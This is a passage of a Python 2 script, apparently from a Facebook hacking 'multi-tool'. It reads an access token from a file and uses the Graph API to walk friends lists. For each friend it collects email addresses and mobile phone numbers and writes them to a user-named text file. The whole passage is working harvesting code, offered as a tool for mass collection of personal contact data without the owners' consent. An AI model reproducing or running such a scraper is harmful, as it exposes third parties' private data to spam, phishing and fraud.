            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;97mInput ID Friends \x1b[1;97m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;97m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mFrom\x1b[1;97m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
                asif()

            mails = raw_input('\x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;97m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;97mName\x1b[1;97m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;97mEmail\x1b[1;97m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\x1b[1;97mTotal Email\x1b[1;97m%s' % len(emfromfriends)
            print '\x1b[1;97mFile saved \x1b[1;97m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo14
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;97m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;97mName\x1b[1;97m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;97mPhone\x1b[1;97m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\x1b[1;97mTotal Phone\x1b[1;97m%s' % len(hp)
            print '\x1b[1;97mFile saved \x1b[1;97m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


